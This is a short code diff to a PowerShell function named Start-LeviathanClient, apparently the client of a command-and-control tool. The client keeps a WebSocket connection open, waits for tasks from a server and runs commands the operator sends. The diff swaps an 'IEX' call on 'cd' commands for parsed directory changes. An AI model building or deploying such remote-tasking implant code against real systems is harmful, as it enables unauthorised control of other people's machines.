@@ -52,19 +52,22 @@ function Start-LeviathanClient {
 
     Write-Verbose "[+] Waiting for tasking"
 
-    while ($client.State -eq [WebSocket4Net.WebSocketState]::Open) {
+    while ($client.State -ne [WebSocket4Net.WebSocketState]::Closed) {
         $rawTask = (Wait-Event -SourceIdentifier 'TaskReceived').MessageData
-        Write-Verbose "[+] Received Task from server"
+        
         #Get the task ID
         $TaskID = $rawTask[0]
+        Write-Verbose "[+] Received Task from server $taskID"
         $ResultData = @()
         switch ($TaskID) {
             #Execute Cmd
             0 {
                 $cmd = [Text.Encoding]::ASCII.GetString($rawTask[2..$rawTask.Length])
                 if ($cmd -match '^cd') {
+                    $cmdargs = $cmd.split('cd')[-1]
                     try {
-                        IEX $cmd
+                        $cmdargs = $cmdargs.trim("`"").trim("'").trim()
+                        cd "$cmdargs"
                         $result = $pwd
                     }
                     catch [System.Management.Automation.ActionPreferenceStopException] {
